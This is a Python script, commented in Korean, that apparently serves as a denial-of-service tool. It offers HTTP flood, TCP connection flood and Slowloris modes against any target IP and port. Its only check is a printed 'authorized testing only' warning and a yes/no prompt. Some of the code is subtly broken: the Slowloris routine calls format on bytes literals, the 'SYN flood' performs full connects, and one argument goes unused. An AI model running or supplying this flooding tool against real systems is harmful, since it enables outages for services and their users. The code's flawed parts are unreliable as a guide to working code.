import requests
import threading
import time
import argparse
import socket
import random
from concurrent.futures import ThreadPoolExecutor
import sys


class DoSAttackTester:
    def __init__(self, target_ip, target_port=8080):
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_url = f"http://{target_ip}:{target_port}"
        self.attack_count = 0
        self.success_count = 0
        self.error_count = 0
        self.running = False

    def http_flood_attack(self, duration, threads, requests_per_thread):
        """HTTP Flood 공격"""
        print(f"Starting HTTP Flood attack on {self.target_url}")
        print(f"Duration: {duration}s, Threads: {threads}, Requests per thread: {requests_per_thread}")

        self.running = True
        self.attack_count = 0
        self.success_count = 0
        self.error_count = 0

        start_time = time.time()

        def worker():
            session = requests.Session()
            session.headers.update({
                'User-Agent': self._get_random_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            })

            while self.running and (time.time() - start_time) < duration:
                try:
                    # 다양한 HTTP 메소드와 경로 사용
                    paths = ['/', '/index', '/api', '/login', '/admin', '/test']
                    methods = ['GET', 'POST', 'PUT', 'DELETE']

                    path = random.choice(paths)
                    method = random.choice(methods)
                    url = f"{self.target_url}{path}"

                    if method == 'GET':
                        response = session.get(url, timeout=5)
                    elif method == 'POST':
                        data = {'test': 'data' * 100}  # 큰 데이터 전송
                        response = session.post(url, data=data, timeout=5)
                    elif method == 'PUT':
                        response = session.put(url, timeout=5)
                    else:
                        response = session.delete(url, timeout=5)

                    self.attack_count += 1
                    if response.status_code < 500:
                        self.success_count += 1

                except Exception as e:
                    self.error_count += 1
                    self.attack_count += 1

                # 요청 간 짧은 대기 (너무 빠르면 로컬 시스템 부하)
                time.sleep(0.01)

        # 스레드 풀로 공격 실행
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]

            # 진행 상황 모니터링
            while (time.time() - start_time) < duration and self.running:
                elapsed = time.time() - start_time
                print(f"[{elapsed:.1f}s] Requests: {self.attack_count}, Success: {self.success_count}, Errors: {self.error_count}")
                time.sleep(2)

            self.running = False

            # 모든 스레드 완료 대기
            for future in futures:
                future.result()

    def tcp_syn_flood(self, duration, threads):
        """TCP SYN Flood 공격 (소켓 기반)"""
        print(f"Starting TCP SYN Flood attack on {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration}s, Threads: {threads}")

        self.running = True
        self.attack_count = 0
        self.success_count = 0
        self.error_count = 0

        start_time = time.time()

        def worker():
            while self.running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)

                    # 연결 시도 후 즉시 종료 (SYN Flood 시뮬레이션)
                    result = sock.connect_ex((self.target_ip, self.target_port))
                    sock.close()

                    self.attack_count += 1
                    if result == 0:
                        self.success_count += 1

                except Exception as e:
                    self.error_count += 1
                    self.attack_count += 1

                time.sleep(0.001)  # 매우 짧은 대기

        # 스레드 풀로 공격 실행
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]

            # 진행 상황 모니터링
            while (time.time() - start_time) < duration and self.running:
                elapsed = time.time() - start_time
                print(f"[{elapsed:.1f}s] Connections: {self.attack_count}, Success: {self.success_count}, Errors: {self.error_count}")
                time.sleep(2)

            self.running = False

            # 모든 스레드 완료 대기
            for future in futures:
                future.result()

    def slowloris_attack(self, duration, connections):
        """Slowloris 공격 (느린 HTTP 요청)"""
        print(f"Starting Slowloris attack on {self.target_url}")
        print(f"Duration: {duration}s, Connections: {connections}")

        self.running = True
        self.attack_count = 0
        self.success_count = 0
        self.error_count = 0

        start_time = time.time()
        sockets = []

        # 초기 연결 생성
        for i in range(connections):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target_ip, self.target_port))

                # 불완전한 HTTP 요청 전송
                sock.send(b"GET /?{} HTTP/1.1\r\n".format(i).encode())
                sock.send(b"Host: {}\r\n".format(self.target_ip).encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")

                sockets.append(sock)
                self.attack_count += 1

            except Exception as e:
                self.error_count += 1

        print(f"Established {len(sockets)} connections")

        # 연결 유지
        while (time.time() - start_time) < duration and self.running:
            for sock in sockets[:]:
                try:
                    # 추가 헤더 전송으로 연결 유지
                    sock.send(b"X-Keep-Alive: {}\r\n".format(int(time.time())).encode())
                    self.success_count += 1

                except Exception as e:
                    sockets.remove(sock)
                    self.error_count += 1

            elapsed = time.time() - start_time
            print(f"[{elapsed:.1f}s] Active connections: {len(sockets)}")
            time.sleep(5)

        # 연결 정리
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

    def _get_random_user_agent(self):
        """랜덤 User-Agent 생성"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
        ]
        return random.choice(user_agents)

    def stop_attack(self):
        """공격 중지"""
        self.running = False
        print("Attack stopped")


def main():
    parser = argparse.ArgumentParser(description='DoS Attack Tester for Security Research')
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, default=8080, help='Target port (default: 8080)')
    parser.add_argument('--attack-type', choices=['http', 'tcp', 'slowloris'],
                        default='http', help='Attack type')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('--threads', type=int, default=50, help='Number of threads')
    parser.add_argument('--requests', type=int, default=1000, help='Requests per thread (HTTP only)')

    args = parser.parse_args()

    # 공격 대상 확인
    print(f"Target: {args.target}:{args.port}")
    print(f"Attack Type: {args.attack_type}")
    print(f"Duration: {args.duration} seconds")
    print("=" * 50)

    # 경고 메시지
    print("WARNING: This tool is for authorized security testing only!")
    print("Ensure you have permission to test the target system.")
    confirmation = input("Continue? (yes/no): ")

    if confirmation.lower() != 'yes':
        print("Attack cancelled.")
        return

    # 공격 실행
    attacker = DoSAttackTester(args.target, args.port)

    try:
        if args.attack_type == 'http':
            attacker.http_flood_attack(args.duration, args.threads, args.requests)
        elif args.attack_type == 'tcp':
            attacker.tcp_syn_flood(args.duration, args.threads)
        elif args.attack_type == 'slowloris':
            attacker.slowloris_attack(args.duration, args.threads)

        print("\nAttack completed!")
        print(f"Total requests/connections: {attacker.attack_count}")
        print(f"Successful: {attacker.success_count}")
        print(f"Errors: {attacker.error_count}")

    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
        attacker.stop_attack()
    except Exception as e:
        print(f"Attack failed: {str(e)}")


if __name__ == "__main__":
    main()